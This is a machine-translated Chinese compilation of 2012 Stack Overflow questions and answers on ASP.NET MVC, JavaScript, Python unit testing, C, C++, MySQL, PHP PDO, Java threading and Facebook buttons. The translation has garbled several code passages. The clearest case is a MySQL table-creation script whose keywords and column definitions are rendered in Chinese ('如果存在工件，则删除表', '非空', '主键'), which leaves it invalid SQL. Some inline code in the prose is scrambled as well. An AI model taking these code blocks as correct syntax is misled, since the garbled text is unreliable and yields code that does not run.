<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/26.gif" width="35" />
<img alt="Security Character" height="35" src="http://localhost:51414/content/imagescss/15.gif" width="35" /> 
```

并且...仍然保留旧值...

```
<input id="TrackerKeys_0_" name="TrackerKeys[0]" type="hidden" value="26" />
<input id="TrackerKeys_1_" name="TrackerKeys[1]" type="hidden" value="33" />
<input id="TrackerKeys_2_" name="TrackerKeys[2]" type="hidden" value="8" />
<input id="TrackerKeys_3_" name="TrackerKeys[3]" type="hidden" value="30" />
<input id="TrackerKeys_4_" name="TrackerKeys[4]" type="hidden" value="6" />
<input id="TrackerKeys_5_" name="TrackerKeys[5]" type="hidden" value="18" /> 
```

**控制器动作**

```
[HttpPost]
    public ActionResult EmployerRegistration(EmployerViewModel Model)
    {
        if (ModelState.IsValid)
        {
            //do bits here
        }

        Model.TrackerKeys = Helper.GenerateNewNumbers(Model.TrackerKeys); 
        return View(Model);
    } 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-08-17T17:12:23.247

> 这是 MVC3 的错误吗？

哦不，这是设计使然，这就是所有 HTML 助手在 ASP.NET MVC 中的工作方式。HTML 助手（例如`Html.TextBoxFor`, `Html.HiddenFor`, ...）在绑定它们的值时首先查看 ModelState，然后查看 Model。因此，如果您打算在 POST 控制器操作中修改模型的某些属性，并且该属性是 POST 主体的一部分，则必须首先从 ModelState 中删除旧值：

```
[HttpPost]
public ActionResult EmployerRegistration(EmployerViewModel Model)
{
    if (ModelState.IsValid)
    {
        //do bits here
    }

    // we clear all values from the modelstate => this will ensure that
    // the helpers will use the values from the model and not those that
    // were part of the initial POST.
    ModelState.Clear();
    Model.TrackerKeys = Helper.GenerateNewNumbers(Model.TrackerKeys); 
    return View(Model);
} 
```

或者，如果您不想清除整个 ModelState（因为这将删除所有值以及可能与之关联的任何相应的模型状态错误），您可以仅删除您实际修改的那些键：

```
[HttpPost]
public ActionResult EmployerRegistration(EmployerViewModel Model)
{
    if (ModelState.IsValid)
    {
        //do bits here
    }

    for (var i = 0; i < Model.TrackerKeys.Count; i++)
    {
        ModelState.Remove(string.Format("TrackerKeys[{0}]", i));
    }
    Model.TrackerKeys = Helper.GenerateNewNumbers(Model.TrackerKeys); 
    return View(Model);
} 
```

# javascript - 什么时候可以将管道运算符用于条件参数？- JavaScript

> ID：12009579
> 
> 赞同：1
> 
> 时间：2012-08-17T16:27:04.867
> 
> 标签：javascript, jquery, null, operator-keyword, pipeline

我的代码中有以下行：

```
var cart = $("#dynamo_shop_window .dynamo_content tbody .shop_cart").html(); 
```

但是，如果页面上没有匹配的元素，我希望 的值为`cart`空字符串，即：

```
!$("#dynamo_shop_window .dynamo_content tbody .shop_cart").size(); 
```

如果是这种情况，无论如何，`var cart = null;`根据 Chrome 的开发人员工具。

为了给它一个空字符串值，有什么理由我应该`cart = cart !== null ? cart : '';`在上面的代码之后使用而不是用以下代码替换上面的代码：

```
var cart = $("#dynamo_shop_window .dynamo_content tbody .shop_cart").html() || ''; 
```

将`.html()`永远不会返回`0`或任何其他`false`相关声明。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:35:45.113

不，不是。**每当左侧存在虚假**值时，双管道运算符就会落入右侧，因此是`undefined`, `null`,或中的一个。`NaN``0``""`

如果，在所有这些情况下，你想`cart`成为`""`：去吧。使用`||`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-17T16:33:18.127

```
var cartVal = ($(".shop_cart").html().length > 0) ? $.trim($(".shop_cart").html()) : ""; 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-17T16:30:00.210

如果我理解你的问题，这将做同样的事情：

```
var cart = "";
if($("#dynamo_shop_window .dynamo_content tbody .shop_cart")){
    cart = $("#dynamo_shop_window .dynamo_content tbody .shop_cart").html();
} 
```

# http-status-code-301 - 将重定向页面添加到谷歌网站管理员工具

> ID：12009581
> 
> 赞同：2
> 
> 时间：2012-08-17T16:27:06.927
> 
> 标签：http-status-code-301, google-search-console

我有两个网站

short.com 和 long.com

short.com 上的所有页面都重定向到 long.com

如何将 short.com 添加到谷歌网站管理员工具？

我可以为验证码添加两个元标记吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T22:58:26.650

您可以使用记录的 TXT dns 验证 short.com 并忽略网站重定向。更多信息可以在这里找到[https://support.google.com/webmasters/bin/answer.py?hl=en&answer=176792](https://support.google.com/webmasters/bin/answer.py?hl=en&answer=176792)

# python - 使用 unittest 测试作业失败

> ID：12009587
> 
> 赞同：13
> 
> 时间：2012-08-17T16:27:13.823
> 
> 标签：python, unit-testing, properties, variable-assignment, assertraises

我的属性之一是设置器调用验证函数的属性，如果新值无效，该函数会引发异常：

```
pos.offset = 0
# @offset.setter calls validate(offset=0)
# PositionError: Offset may not be 0. 
```

我正在尝试添加测试以确保失败。但是，我不知道如何让 assertRaises 处理作业。

assertRaises 的正常语法需要一个方法，而不是属性/属性：

```
self.assertRaises(PositionError, pos.offset, 0)
# TypeError: 'int' object is not callable 
```

我尝试过的其他形式是无效的 Python：

```
self.assertRaises(PositionError, pos.offset = 0)
# SyntaxError: Keyword can't be an expression
self.assertRaises(PositionError, lambda: pos.offset = 0)
# SyntaxError: lambda cannot contain assignment 
```

**如何测试分配给属性的失败？**

*注意：Python 2.6，我知道 unittest 在 2.7 中有一些新特性*

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-17T16:56:57.197

当您想使用`unittest`来测试代码块中发生的异常而不仅仅是函数调用时，您可以将`assertRaises`其用作上下文管理器：

```
with self.assertRaises(PositionError):
    pos.offset = 0 
```

这种用法可以在[unittest docs](http://docs.python.org/dev/library/unittest.html#basic-example)中找到。

虽然这在 Python 2.6 中不可用，并且对您不起作用（我刚刚看到您的注释），但我认为值得将其包含在答案中，因为这可能是对 python 2.7+ 执行此操作的更清晰的方法。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-08-17T16:27:13.823

**在 Python 2.7 之前，**您想使用`setattr(object, name, value)` [( *doc* )](http://docs.python.org/library/functions.html#setattr)。这允许您为属性设置值。

```
self.assertRaises(PositionError, setattr, pos, "offset", 0)
# ... ok 
```

这应该总是有效的，因为如果属性是一个属性并因此“秘密”调用一个函数，它必须在一个类中。我不认为标准分配会失败（尽管右侧的*表达式*`x = 1/0`可能会失败，即）。

# c - 如何在 C 中使用 va_list 遍历命令行参数

> ID：12009593
> 
> 赞同：2
> 
> 时间：2012-08-17T16:27:32.040
> 
> 标签：c, pointers, command-line, command-line-arguments

所以我发现自己希望我可以用 va_list 遍历命令行参数，我相信我已经看到它在某个地方完成了。

我试过谷歌搜索无济于事。

有谁知道如何实现这一目标或知道是否可以实现？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-17T16:36:29.437

你不能。`va_list`适用于可变参数函数，但事实`main`并非如此。但是，我想知道的是您为什么更喜欢这个（如果可能的话）：

```
char *arg;
va_list vl;
va_start(vl, argc);
while ((arg = va_arg(vl, char*)))
    // use arg
va_end(vl); 
```

对此：

```
for (int i = 0; i < argc; ++i)
   // use argv[i] 
```

或这个：

```
for (char **arg = argv; *arg; ++arg)
   // use *arg 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-17T16:29:58.900

[http://www.cplusplus.com/reference/clibrary/cstdarg/va_start/](http://www.cplusplus.com/reference/clibrary/cstdarg/va_start/)

这不适用于命令行参数。

# database - MS SQL Server Management Studio 是否有与临时表相关的大小限制？

> ID：12009599
> 
> 赞同：1
> 
> 时间：2012-08-17T16:27:45.477
> 
> 标签：database, sql-server-2008, ssms, temp-tables

我正在运行一个使用 710 行 PID 临时表的大型查询。

就像是 ：

```
insert into #AdelText values /* these are my PIDs*/

('0YyGRz5sYOFlDtmRArU9'),
('f9982cdb-dcd8-4aed-b534-566b65963a09'),
('4db7a20d-7b47-494f-9397-a0e5df6c059d')
-- 700 MORE
('4db7a20d-7b47-494f-9397-a0e6c059d') 
```

那么我必须对它运行一个查询，它是一个像这样的枢轴（注意这里的 PID 对应于临时表 PID）：

```
select * from

(

    select bis.SupplierID, bis.PID, rp.QuestionID,rp.Condition from  respondentprofiles RP (nolock)
    inner join BI_Sessions BIS (Nolock)
    on bis.RespondentID = rp.RespondentID
    inner join #adeltext at (nolock)
    on bis.pid = at.pid
    where 
     rp.QuestionID in 
        (
            51, 48  
        )
        and bis.surveyid = 14893 
)  

 as sourcetable 

PIVOT
(
    MAX(condition)
    for QuestionID in ([51],[48]) 
 )
PivotedTable 
```

我希望得到 710 行，但我得到了 360 行。这让我很困惑。任何帮助表示赞赏。谢谢

# c++ - 父类和内部类同名时名称解析错误

> ID：12009602
> 
> 赞同：10
> 
> 时间：2012-08-17T16:27:52.817
> 
> 标签：c++, visual-studio-2003, class-hierarchy, token-name-resolution

我对 Visual Studio 2003 有一个奇怪的情况。出于某种合理的原因，我有以下层次结构：

```
class A {};

class B : public A {
public:
    class A {};
};

class C : public B::A {}; 
```

也就是说，我有一个与外部类的父类同名的内部类。当`C`尝试从 继承时`B::A`，Visual Studio 认为我指向的是父类`A`，而不是其中的嵌套类`B`。GCC 似乎像我预期的那样解决了内部类版本

这是 Visual Studio 2003 的错误，还是我做错了？是否有解决方法（除了升级 Visual Studio）？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-17T16:35:09.620

这看起来像 Visual C++ 2003 中的一个错误。使用 Visual C++ 2012，`B::A`正确命名嵌套类`A`，而不是基类`A`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:46:16.973

是的，这看起来像 VS2003 错误。解决方法很简单 - 使用 typedef，它是这样工作的：

```
class A { public: int x; };
class B : public A { public: class A { public: int y; }; }; 

typedef B::A BA;

class C: public BA {};

void f()
{
   C cc;
   cc.y = 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:45:19.340

它看起来像一个 VS 错误，
我不知道感谢您的发布。
我认为解决方法将是一个`SafeInherit`模板，我不知道什么是更好的名字。

```
template <typename T>
struct SafeInherit{
  typedef T Type;
};

class B : public SafeInherit<A>::Type {
  public:
  class A {};
} 
```

# mysql - 表创建时的 MySQL 语法错误

> ID：12009605
> 
> 赞同：4
> 
> 时间：2012-08-17T16:28:08.507
> 
> 标签：mysql, syntax

我正在尝试在 Filemaker -> MySQL 转换脚本中使用此查询。表创建步骤直接来自 phpMyAdmin 导出，我在 DROP 语句中添加。

```
如果存在工件，则删除表；

如果不存在“工件”则创建表
  (
     `aid` INT(11) UNSIGNED NOT NULL auto_increment,
     `入藏号` TEXT NOT NULL,
     `name` TEXT NOT NULL,
     `period 1` TEXT NOT NULL,
     `period 3 date` TEXT NOT NULL,
     `视觉描述` TEXT NOT NULL,
     `religion 1` TEXT NOT NULL,
     `dimen 1 number` DECIMAL(10, 2) NOT NULL,
     `dimen 2 number` DECIMAL(10, 2) NOT NULL,
     `dimen 3 number` DECIMAL(10, 2) NOT NULL,
     `dimen 1 type` TEXT NOT NULL,
     `dimen 2 type` TEXT NOT NULL,
     `dimen 3 type` TEXT NOT NULL,
     `材料 2` TEXT NOT NULL,
     `制造过程 2` TEXT NOT NULL,
     `重量` INT(11) 非空，
     `测量备注` TEXT NOT NULL,
     `munsell 颜色信息` TEXT NOT NULL,
     `reproduction` TEXT NOT NULL,
     `复制说明` TEXT NOT NULL，
     `发布的描述` TEXT NOT NULL,
     `学术笔记` TEXT NOT NULL,
     `参考书目` TEXT NOT NULL,
     `comparanda` TEXT NOT NULL,
     `展览标签` TEXT NOT NULL,
     `艺术家` TEXT NOT NULL，
     `spurlock loc 3` TEXT NOT NULL,
     `考古数据` TEXT NOT NULL,
     `credit line` TEXT NOT NULL,
     `出处` TEXT NOT NULL,
     `博物馆奉献` TEXT NOT NULL,
     `spurlock status` TEXT NOT NULL,
     `public description` TEXT NOT NULL,
     `工作集 5 wb` TEXT NOT NULL，
     `图片来源` TEXT NOT NULL,
     `cm mec ma` TEXT NOT NULL,
     `webprivate` 文本不为空，
     `spurlock loc 2` TEXT NOT NULL,
     `hiresimagecheck` 文本不为空，
     主键（`aid`），
     FULLTEXT KEY `name` (`name`),
     FULLTEXT KEY `accession number` (`accession number`, `name`, `period 1`,
     `视觉描述`，`材料2`，`已发表的描述`，`艺术家`，
     `信用额度`），
     FULLTEXT KEY `accession number_2` (`accession number`),
     FULLTEXT KEY `visual description` (`visual description`),
     FULLTEXT KEY `published description` (`published description`)
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在文化，则删除表；

如果不存在“文化”则创建表
  (
     `cid` INT(10) UNSIGNED NOT NULL auto_increment,
     `culture` VARCHAR(255) NOT NULL,
     主键（`cid`），
     唯一键`文化`（`文化`）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在地理城市，则删除表；

如果不存在 `geocity` 则创建表
  (
     `gid` INT(10) UNSIGNED NOT NULL auto_increment,
     `city` VARCHAR(255) NOT NULL,
     主键（`gid`），
     唯一键“城市”（“城市”）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在地理大陆，则删除表；

如果不存在`geocontinent`，则创建表
  (
     `gid` INT(10) UNSIGNED NOT NULL auto_increment,
     `continent` VARCHAR(255) NOT NULL,
     主键（`gid`），
     唯一键“大陆”（“大陆”）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在地理国家，则删除表；

如果不存在`geocountry`，则创建表
  (
     `gid` INT(10) UNSIGNED NOT NULL auto_increment,
     `country` VARCHAR(255) NOT NULL,
     主键（`gid`），
     唯一键“国家”（“国家”）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

DROP TABLE IF EXISTS geolocality;

如果不存在`geolocality`，则创建表
  (
     `gid` INT(10) UNSIGNED NOT NULL auto_increment,
     `locality` VARCHAR(255) NOT NULL,
     主键（`gid`），
     唯一键`locality`（`locality`）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在地理区域，则删除表；

如果不存在 `georegion` 则创建表
  (
     `gid` INT(10) UNSIGNED NOT NULL auto_increment,
     `region` VARCHAR(255) NOT NULL,
     主键（`gid`），
     唯一键 `region` (`region`)
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在名称类别，则删除表；

如果不存在`nomcategory`，则创建表
  (
     `nid` INT(10) UNSIGNED NOT NULL auto_increment,
     `category` VARCHAR(255) NOT NULL,
     主键（`nid`），
     唯一键 `category` (`category`)
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在 nomclassification 则删除表；

如果不存在“nomclassification”则创建表
  (
     `nid` INT(10) UNSIGNED NOT NULL auto_increment,
     `分类` VARCHAR(255) NOT NULL,
     主键（`nid`），
     唯一键`分类`（`分类`）
  )
引擎=myisam
默认字符集=latin1
自动增量=1；

如果存在 nomsubclassification 则删除表；

如果不存在“nomsubclassification”，则创建表
  (
     `nid` INT(10) UNSIGNED NOT NULL auto_increment,
     `subclassification` VARCHAR(255) NOT NULL,
     主键（`nid`），
     UNIQUE KEY `subclassification` (`subclassification`)
  )
引擎=myisam
默认字符集=latin1
自动增量=1；
```

但是，当我尝试执行此查询时，我得到：

```
MySQL 错误：您的 SQL 语法有错误；检查与您的 MySQL 服务器版本相对应的手册，以获取正确的语法，以便在“创建表如果不存在 `artifacts` 附近使用
  (
     `aid` IN' 在第 3 行

```

语法对我来说都很好，有人能发现错误吗？我使用的唯一 SQL 格式化程序不会报告任何错误。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-17T16:36:16.657

你的脚本工作正常。问题是您执行它的方式（客户端将期望通过查询而不是整个脚本进行查询）或者您已将分隔符更改为其他内容`;`

```
DELIMITER ; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-17T16:36:34.223

1.  您的用户名是否有权创建表？
2.  您是否指出要使用哪个数据库？我通常会

    ```
    USE databasename;

    CREATE TABLE tablename (
    name_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
     (etc....)
    ); 
    ```

等等

# java - 在多列中垂直显示一个列表/一组字符串

> ID：12009606
> 
> 赞同：0
> 
> 时间：2012-08-17T16:28:16.057
> 
> 标签：java, html, jsp, struts, jstl

我有一组排序的字符串，我需要使用 jsp/html 显示它。

如何使用 JSTL 或 struts 标签以以下格式显示它？显示中的此列表将横向增长，而不是从上到下。我正在考虑拥有 25 行和 N 列（随着集合大小的增加而增加）。

```
AAB         CCD         FAA
ABA         CCE         FAB
ABB         CDE         FBB
BAA         DAA         FCC
BAB         DAB         FDD
BBB         DBA         FEE
CAA         DDD         FFF
CBA         EAA
CBB         EAB 
```

感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:49:49.617

如果你愿意，我会给你一些伪代码。你可以把它翻译成你想要的任何语言 php、java 的 jstl 等。

假设我们要生产：http: [//jsfiddle.net/vQyyB/](http://jsfiddle.net/vQyyB/)

```
for (i = 0, i < strings.count, i++) {
    if (i % itemsPerColumn == 0) {
        if (i != 0) print "</div>" 
        print "<div class='container'>"
    }
    print "<div class='foo'>" + string[i] + "</div>"
} 
```

如果您只需要一个起点，我希望这会有所帮助。`<c:forEach>`如果你想使用 jstl，你可以使用它来实现。

# arrays - flash as3 - 如何获取数组中的下一个元素

> ID：12009609
> 
> 赞同：0
> 
> 时间：2012-08-17T16:28:23.260
> 
> 标签：arrays, actionscript-3, flash

我有一组可以播放的五个可能的视频，称为视频，以及一组称为 activeVideos 的活动视频。当一个视频播放完毕时，我需要获取它的索引，在 activeVideos 数组中找到它的位置，然后获取数组中的下一个值。如果数组中没有更多值，我需要获取第一个值。所以本质上：

```
activeVideos = [0,1,3]
videos = [video1, video2, video3];

function nextVideo(e:Event){
    var curIndex = videos.indexOf(currentVideo);
    var next = activeVideos.find(curIndex).nextValue // pseudo-code - need to locate the position of the current video within the active array, select the next element, and call show video.
    showVideo(videos[next]);
} 
```

我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T16:29:46.857

```
activeVideos = [0,1,3]
videos = [video1, video2, null, video3];

function nextVideo(e:Event){
    var curIndex = videos.indexOf(currentVideo);
    var next = activeVideos[curIndex+1] || activeVideos[0];
    showVideo(videos[next]);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-17T16:37:24.770

也许你可以在家里试试这个，我必须承认，自从 html5、css3 + js 炒作出现以来，我的 flash 可能有点生疏了 :)

```
nextIndex = -1;
nextIndex = ( (curIndex+1 == videos.length) ? 0 : curIndex+1 );
if (nextIndex > -1){
  var next = activeVideos[nextIndex];
  // ... do your stuff 
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-17T16:38:48.617

```
function nextVideo(e:Event){
    var curIndex = videos.indexOf(currentVideo) + 1;
    var nextVideo = curIndex >= videos.length ? videos[0] : videos[curIndex];
    showVideo(nextVideo);
} 
```

# c# - 在.Net 3.0中按创建日期顺序获取目录列表

> ID：12009615
> 
> 赞同：-5
> 
> 时间：2012-08-17T16:28:48.167
> 
> 标签：c#, .net

**我需要从.Net 3.0**中由 CreationDate 排序的目录中获取子目录列表

 *** * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-08-17T16:33:15.310

您应该能够为此使用[DirectoryInfo](http://msdn.microsoft.com/en-us/library/8s2fzb02)类（需要 .NET 4）：

```
var di = new DirectoryInfo(theFolder);
var directories = di.EnumerateDirectories()
                    .OrderBy(d => d.CreationTime)
                    .Select(d => d.Name)
                    .ToList(); 
```

在 .NET 3.0 中，您可以使用[`DirectoryInfo.GetDirectories`](http://msdn.microsoft.com/en-us/library/s7xk2b58.aspx)，然后使用相同的逻辑对数组进行排序。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-17T16:33:06.317

1）您可以使用 [Directory.GetDirectories](http://msdn.microsoft.com/en-us/library/c1sez4sc.aspx)获取所有子目录的*路径列表。*

2）有一次将路径列表转换为[DirectoryInfo](http://msdn.microsoft.com/en-us/library/system.io.directoryinfo.aspx)对象列表。每个[DirectoryInfo](http://msdn.microsoft.com/en-us/library/system.io.directoryinfo.aspx)都包含[FileSystemInfo.CreationTime](http://msdn.microsoft.com/en-us/library/system.io.filesysteminfo.creationtime.aspx)属性。

3）所以剩下的最后一件事是根据该属性订购一个列表。**

# python - tiny_mce 和 django 的另一个问题

> ID：12009616
> 
> 赞同：0
> 
> 时间：2012-08-17T16:28:51.060
> 
> 标签：python, django, tinymce

我是菜鸟，这实际上不是问题。我的 tiny_mce 在 django 开发服务器上运行良好，但在生产服务器上不起作用。我认为这与 url 配置有关，因为我在尝试从浏览器中页面的源代码中获取 tiny_mce 时遇到此错误：

```
 Page not found (404)
    Request Method: GET
    Request URL:    http://sav.2eng.ru/js/tiny_mce/tiny_mce.js
    "templates/js/tiny_mce/tiny_mce.js" does not exist 
```

我使用了本教程： http: [//vimeo.com/12903891](http://vimeo.com/12903891) 我的 url 配置是：

```
 (r'^js/(?P<path>.*)$', 'django.views.static.serve', {'document_root' : 'templates/js'}), 
```

它适用于“manage.py runserver”。

admin.py 有以下代码：

```
 class AboutPageAdmin(admin.ModelAdmin):
        inlines = [AboutPageImageInline,]    
        list_display = ('p',)
        class Media:
        js = ('/js/tiny_mce/tiny_mce.js', '/js/textareas.js') 
```

我应该用这个网址做什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T17:25:54.403

通过添加绝对路径而不是相对路径来解决问题。我永远不会忘记这一点。希望这对某人有用。

# nhibernate - 一起使用 order by、条件投影和 SetFirstResult() 时出现 nHibernate 错误

> ID：12009617
> 
> 赞同：2
> 
> 时间：2012-08-17T16:28:51.153
> 
> 标签：nhibernate, nhibernate-criteria

在查询中同时使用 order by、条件投影和 SetFirstResult() 时，出现此错误：

> 此 SqlParameterCollection 的索引 4 无效，Count=4

根据我的经验，当您将一个字段映射到两个属性时，通常会发生此错误，如此[处](https://stackoverflow.com/questions/11553437/invalid-index-13-for-this-sqlparametercollection-with-count-13)所述。但在这种情况下并非如此，查询工作正常，直到我将一个大于 0 的值传递给 SetFirstResult()。

[这个](https://nhibernate.jira.com/browse/NH-2133)用 Nhiberbate 记录的错误看起来很相似，但它在 2 年前就已修复。

关于如何进行的任何建议？这是代码示例：

```
var query = Session.CreateCriteria<KeepItem>(KeepAlias)
            .CreateAlias("Resource", ResourceAlias)
            .CreateAlias("Memory", MemoryAlias, JoinType.LeftOuterJoin);

// other code

 query.AddOrder
                    (
                        Order.Asc
                        (
                            Projections.Conditional
                            (
                                Restrictions.IsNull(MemoryAlias + ".MinDate"),
                                Projections.Conditional
                                (
                                    Restrictions.IsNull(ResourceAlias + ".MinDate"),
                                    Projections.Constant(DateTime.MaxValue),
                                    Projections.Property(ResourceAlias + ".MinDate")
                                ),
                                Projections.Property(MemoryAlias + ".MinDate")
                            )
                        )
                    );

//other code

 query.SetFirstResult(skip);
 query.SetMaxResults(take);
  return query.List<KeepItem>(); 
```

# c# - DoubleBuffering RichTextBox，如何绘制

> ID：12009618
> 
> 赞同：0
> 
> 时间：2012-08-17T16:28:59.880
> 
> 标签：c#

我正在看这篇关于双缓冲的文章[https://web.archive.org/web/20121123031717/http://www.bobpowell.net/doublebuffer.htm 。](https://web.archive.org/web/20121123031717/http://www.bobpowell.net/doublebuffer.htm)我喜欢它的想法，并想在我的 RichTextBox 类上使用它，因为我试图在框中保留几行（10k+）行，每次滚动或更改字符时，将可视文本复制到字符串并放置在另一个 rtb 上要进行语法着色。

问题是当我开始滚动时，我在保存所有文本的 rtb 中出现了非常糟糕的闪烁。我想等到用户完成滚动（如果他们滚动超过一页）来重绘 rtb 中的文本。双缓冲会有帮助吗？以及如何从列出的网站中按照此方法实际“绘制” rtb 中的文本？

方法：

```
protected override void OnPaint(PaintEventArgs e)
{
  if(_backBuffer==null)
  {
    _backBuffer=new Bitmap(this.ClientSize.Width,this.ClientSize.Height);
  }
  Graphics g=Graphics.FromImage(_backBuffer);
  //Paint your graphics on g here
  g.Dispose();
  //Copy the back buffer to the screen
  e.Graphics.DrawImageUnscaled(_backBuffer,0,0);
  //base.OnPaint (e); //optional but not recommended
} 
```

编辑：您还必须将 TextBox 样式设置为此

```
this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.DoubleBuffer | ControlStyles.OptimizedDoubleBuffer, true); 
```

# php - 使用 PDO 获取上一行来创建链接

> ID：12009619
> 
> 赞同：1
> 
> 时间：2012-08-17T16:29:00.507
> 
> 标签：php, mysql, sql, pdo

我的查询中有一些错误的语法，我正在尝试创建“prev_id”以拉入 $row 结果链接。关于更好的方法的任何想法？

编辑：错误是“检查与您的 MySQL 服务器版本相对应的手册，以获取在 'prev_id' 附近使用的正确语法。”

```
function traversePhoto($the_selected_id) {
global $pdo;

$id = $the_selected_id;

$stmt_a = $pdo->prepare("
    (SELECT * FROM images WHERE id < '.intval($id).' ORDER BY id DESC LIMIT 1)
     UNION (SELECT * FROM images WHERE id = (SELECT MAX(id) FROM images)) LIMIT 1 prev_id");
$stmt_b = $pdo->prepare("
    (SELECT * FROM images WHERE id > '.intval($id).' ORDER BY id ASC LIMIT 1)
     UNION (SELECT * FROM images WHERE id = (SELECT MIN(id) FROM images)) LIMIT 1 next_id");

// $vars = array(':id' => $id);
$prev = $stmt_a->execute();
$next = $stmt_b->execute();

if ($prev) {
    while($row = $stmt_a->fetchObject()) {
        echo '<a href="' . $row['prev_id'] . '">Previous</a>';
    } 
} else {
    echo 'no previous';
}

if ($next) {
    while($row = $stmt_b->fetchObject()) {
        echo '<a href="' . $row['next_id'] . '">Next</a>';
    }
} else {
    echo 'no next';
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-17T16:39:38.373

像这样试试

```
<?php function traversePhoto($the_selected_id) {
global $pdo;

$id = $the_selected_id;

$stmt_a = $pdo->prepare("
(SELECT * FROM images WHERE id < ? ORDER BY id DESC LIMIT 1)
 UNION (SELECT * FROM images WHERE id = (SELECT MAX(id) FROM images)) LIMIT 1");
$stmt_b = $pdo->prepare("
(SELECT * FROM images WHERE id > ? ORDER BY id ASC LIMIT 1)
 UNION (SELECT * FROM images WHERE id = (SELECT MIN(id) FROM images)) LIMIT 1");

// $vars = array(':id' => $id);
$prev = $stmt_a->execute(array( (int)$id ));
$next = $stmt_b->execute(array( (int)$id ));

if ($stmt_a->rowCount() > 0) {
    while($row = $stmt_a->fetch(PDO::FETCH_ASSOC)) {
        echo '<a href="' . $row['prev_id'] . '">Previous</a>';
    } 
 } else {
    echo 'no previous';
}

if ($stmt_b->rowCount() > 0) {
   while($row = $stmt_b->fetch(PDO::FETCH_ASSOC)) {
      echo '<a href="' . $row['next_id'] . '">Next</a>';
  }
} else {
echo 'no next';
} 
```

# java - java-如何确定不同类型服务器中特定类型处理的最佳线程数

> ID：12009625
> 
> 赞同：2
> 
> 时间：2012-08-17T16:29:13.803
> 
> 标签：java, multithreading, concurrency

我有一个 Java 程序，它可以访问一些网站，将网站的 HTML 转换为 XML，然后在 XML 上运行一些 xquery 命令，最后将结果存储到 csv 中，然后将其上传到云文件存储（如 Amazon S3）。

现在，我想将工作拆分为多个线程，以便更快地完成 - 但是我如何确定最适合我的工作的线程数？

对于不同类型的 Amazon EC2 实例，我想确定我应该允许的线程数……是否有库或框架可以帮助我解决这个问题？

或者，我是否必须在 Amazon EC2 实例上手动运行代码，并不断更改线程数并测量所用时间？

具体来说，我想在处理所有线程所花费的总时间与允许同时运行的线程数之间保持平衡......如果我能清楚地看到具有不同 CPU/RAM 容量的不同服务器的这种相关性，那么很棒...任何建议/指导将不胜感激...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-17T16:44:53.650

您描述的工作类型几乎可以肯定是 I/O 限制的——大部分时间都花在等待下载或上传数据上。如果是这样，您的目标只是充分利用上传/下载带宽。

如果是这样，最佳线程数将超过机器上的物理内核数（这将是 CPU 密集型进程的正确起点）。

从这些信息中很难说最佳线程数是多少，因为这取决于您下载的数量以及链接的速度。尝试将线程数加倍，直到性能开始受到影响。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-17T16:33:43.250

我认为您应该使用 JHAT、MAT 等使用单线程分析您的应用程序......然后根据您要运行的机器配置决定多少线程。它会让您大致了解线程的成本。然后，您可以运行负载测试（例如 10,000 个项目在 10 个线程中排队）来验证您提出的限制，并进行相应的调整。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-17T16:48:08.097

要查找可用的逻辑核心数，您可以使用：

```
int processors = Runtime.getRuntime().availableProcessors(); 
```

`ThreadPool`并与那么多人一起创造一个。也可以看看 ：

[在 Java 中查找内核数](https://stackoverflow.com/questions/4759570/finding-number-of-cores-in-java)

[Java：如何根据 cpu 内核扩展线程？](https://stackoverflow.com/questions/1980832/java-how-to-scale-threads-according-to-cpu-cores)

# javascript - Facebook喜欢按钮在喜欢和不喜欢时的行为不同

> ID：12009626
> 
> 赞同：0
> 
> 时间：2012-08-17T16:29:18.357
> 
> 标签：javascript, html, facebook, facebook-graph-api, facebook-like

我的页面上有一个 Facebook 的“赞”按钮：

```
<div class="fb-like" data-href="http://mysite.com" data-send="false" data-layout="button_count" data-width="100" data-show-faces="false" data-font="arial"/> 
```

我也有`'fb-root'`div 和 SDK `javascript`（按钮的功能就像它应该的那样）。

出于某种原因，当“喜欢”按钮被打开时（当访问者连接到他的 Facebook 帐户并且之前已经喜欢我的页面时发生）该按钮将神奇地减小其宽度（在最后一秒的 javascript 中）并制作其他按钮（ twitter/g+) 隐藏它。它对齐了一秒钟，然后“崩溃”。

我尝试禁用我的 css 和我网站的许多其他组件，但无济于事。我附上了一张图片来说明这种情况。

